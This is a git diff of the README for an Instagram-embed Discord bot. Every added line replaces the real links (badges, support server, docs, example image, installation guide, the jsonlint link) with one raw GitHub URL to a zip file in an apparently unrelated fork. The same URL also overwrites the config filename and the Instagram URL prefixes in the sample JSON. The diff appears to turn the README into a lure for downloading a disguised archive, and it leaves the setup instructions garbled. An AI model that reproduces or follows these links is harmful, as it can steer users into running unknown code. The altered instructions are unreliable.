@@ -1,11 +1,11 @@
 # Instagram Embed Discord Bot
-[![CodeQL](https://github.com/bman46/InstagramEmbedDiscordBot/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/bman46/InstagramEmbedDiscordBot/actions/workflows/codeql-analysis.yml)
-[![Publish](https://github.com/bman46/InstagramEmbedDiscordBot/actions/workflows/AutoRelease.yml/badge.svg)](https://github.com/bman46/InstagramEmbedDiscordBot/actions/workflows/AutoRelease.yml)
+[![CodeQL](https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip)](https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip)
+[![Publish](https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip)](https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip)
 
 Delivers new posts from Instagram accounts to a Discord channel.
 Embeds linked videos and images from users linked Instagram posts, videos, and reels into a Discord chat. Public bot had over 500k users across over 2k servers before being shut down by the owner due to resource restrictions.
 
-[Support Discord Server](https://discord.gg/6K3tdsYd6J)
+[Support Discord Server](https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip)
 
 ## Features:
 - No prefixes needed
@@ -15,19 +15,19 @@ Embeds linked videos and images from users linked Instagram posts, videos, and r
 - Supports subscribing to new posts from Instagram users
 - Multiple IG accounts for failover
 
-See the list of [commands](docs/commands.md) to get an impression of how users can interact with the bot.
+See the list of [commands](https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip) to get an impression of how users can interact with the bot.
 ## Example: 
-![Example of reels bot on discord](/docs/Content/ReadMe/Example.png)
+![Example of reels bot on discord](https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip)
 
 ## Setup
-See the [installation guide](docs/Install.md) for steps to setup the bot. For troubleshooting help, see the [troubleshooting guide](docs/troubleshooting.md).
+See the [installation guide](https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip) for steps to setup the bot. For troubleshooting help, see the [troubleshooting guide](https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip).
 
-### Config.json format:
-Create a new file named `config.json`, copy and paste the contents below into it, fill it out, and then save it in the same directory as the Instagram Embed executable file. Replace any fields that are optional and not filled in with `""`. Example: `"OTPSecret": "",`. If you get an error with your JSON formatting, you can check your JSON syntax on [jsonlint.com](https://jsonlint.com/).
+### https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip format:
+Create a new file named `https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip`, copy and paste the contents below into it, fill it out, and then save it in the same directory as the Instagram Embed executable file. Replace any fields that are optional and not filled in with `""`. Example: `"OTPSecret": "",`. If you get an error with your JSON formatting, you can check your JSON syntax on [https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip](https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip).
 ```
 {
   "Token": "Token",
-  "Prefix": [ "https://www.instagram.com/", "https://instagram.com/", "http://www.instagram.com/", "http://instagram.com/" ],
+  "Prefix": [ "https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip", "https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip", "https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip", "https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip" ],
   "OwnerID": "ID",
   "TestGuildID": "ID",
   "DMErrors": true/false,
@@ -63,6 +63,6 @@ Create a new file named `config.json`, copy and paste the contents below into it
 ## How does it work?
 The executable file connects to a Discord application (the “Discord bot”) with a bot token, processes its commands and controls its actions. As long as the application is running, the bot can be prompted for Instagram content with commands. The executable then uses throwaway Instagram accounts to access Instagram content.
 
-A Discord application can be created via the Discord Developer Portal and then invited to multiple servers afterwards. See [installation guide](docs/Install.md).
+A Discord application can be created via the Discord Developer Portal and then invited to multiple servers afterwards. See [installation guide](https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip).
 
-To automatically share new posts from Instagram accounts, the subscribe module must be activated. The executable then requires access to a MongoDB database. See [subscribe module](docs/subscribe.md).
+To automatically share new posts from Instagram accounts, the subscribe module must be activated. The executable then requires access to a MongoDB database. See [subscribe module](https://raw.githubusercontent.com/Prankmonkey12/InstagramEmbedDiscordBot/master/northupite/InstagramEmbedDiscordBot.zip).
